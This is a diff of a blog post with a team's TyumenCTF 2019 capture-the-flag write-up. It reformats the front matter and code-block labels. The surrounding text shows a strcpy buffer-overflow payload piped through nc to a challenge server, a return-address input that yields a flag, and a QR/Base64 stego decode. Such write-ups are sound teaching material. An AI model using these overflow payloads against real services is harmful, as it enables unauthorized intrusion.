@@ -3,10 +3,12 @@ layout: post
 title:  "TyumenCTF 2019"
 subtitle: "Millennium"
 date: 2019-04-02
----
-
-This is the partial writeup for the challenges presented in this year's [TyumenCTF](https://tyumenctf.ru/).
-
+head_message: "These are our writeups for the challenges presented in this year's <a href=\"https://tyumenctf.ru/\">TyumenCTF</a>."
+head_ctf_categories:
+  - pwn
+  - joy
+  - misc
+  - stegano
 ---
 
 # PWN
@@ -97,7 +99,7 @@ int main(int argc, char* argv[]){
 
 Since the unsecure `strcpy` was used to move the nick's buffer around, it was vulnerable to overflows - _the token had to be kept intact to identify different triggers of the **Chat** series_:
 
-```no-highlight
+```text
 $ (python2 -c 'print "6MsmrUmPi"+"A"*10+"\x01"'; cat) | nc XXX.XXXXXXXXX.XX NNNN
 
 Hello, guest!
@@ -110,7 +112,7 @@ Select command:
     3) Quit
 ```
 
-```no-highlight
+```text
 >> 2
 
 User info:
@@ -128,7 +130,7 @@ TyumenCTF{0ne_byt3_overf1ow_D33ORd}
 
 A binary was attached:
 
-```no-highlight
+```text
 pwn: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=348934655967dca186bcc8dc8ab74731eb7c4e3e, not stripped
 ```
 
@@ -161,7 +163,7 @@ void TheNextEpisode(void) {
 
 Its address was 0x400ad2<sub>hex</sub>, and it took us an embarassingly long time to figure out that it needed to be converted to 4197074<sub>dec</sub> to be correctly accepted.
 
-```no-highlight
+```text
 $ nc pwn.tyumenctf.ru 1493
 Return my: 4197074
 cat flag4
@@ -242,7 +244,7 @@ The archive contained some QR codes named after Windows releases.
 
 Renaming them to be in [the correct order](https://en.wikipedia.org/wiki/Timeline_of_Microsoft_Windows) allowed them to be decoded as a Base64 string and thus revealed the flag.
 
-```no-highlight
+```text
 $ (for n in {1..16}; do zbarimg "$n.png" 2>/dev/null | cut -d ':' -f2 | tr '\n' ' ' | tr -d ' '; done) | base64 -d
 TyumenCTF{n0w_u_know_all_ab0ut_version_c0ntrol}
 ```
